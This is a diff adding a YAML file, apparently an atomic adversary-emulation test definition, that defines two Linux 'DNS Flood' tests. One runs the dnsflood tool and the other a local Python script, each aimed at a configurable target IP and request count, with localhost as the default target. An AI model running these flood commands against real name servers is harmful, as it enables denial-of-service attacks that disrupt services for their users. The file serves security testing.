@@ -1,0 +1,61 @@
+attack_technique: dns_flood
+display_name: "DNS request Flood Attack"
+category: "Flood"
+reference: "https://en.wikipedia.org/wiki/DNS_Flood"
+atomic_tests:
+- name: "DNS Flood"
+  description: ""
+  supported_platforms:
+  - linux
+  input_arguments:
+    query_name:
+      description: "Query name "
+      type: String
+      default: ' '
+    target_ip:
+      description: "Target IP"
+      type: String
+      default: 127.0.0.1
+    target_port:
+      description: "Destination port"
+      type: Interger
+      default: 53
+    number:
+      description: "number of requests to be performed"
+      type: Interger
+      default: 10
+    extra_args:
+      description: "extra arguments"
+      type: String
+      default: -t PTR
+  executor:
+    command: |
+      dnsflood #{query_name} #{target_ip} -p #{target_port} -n #{number} #{extra_args}
+    cleanup_command: ""
+    name: command_prompt
+- name: "DNS Flood"
+  description: "python writen attack_technique"
+  supported_platforms:
+  - linux
+  input_arguments:
+    query_name:
+      description: "Query name "
+      type: String
+      default: ' '
+    target_ip:
+      description: "Target IP"
+      type: String
+      default: 127.0.0.1
+    number:
+      description: "number of requests to be performed"
+      type: Interger
+      default: 10
+    query_type:
+      description: "query type"
+      type: String
+      default: PTR
+  executor:
+    command: |
+      python3 $HOME/dist/py/aus-py/app.py dns_flood --args '{"nameserver":"#{target_ip}","query_name":"#{query_name}","query_type":"#{query_type}"}'
+    cleanup_command: ""
+    name: command_prompt
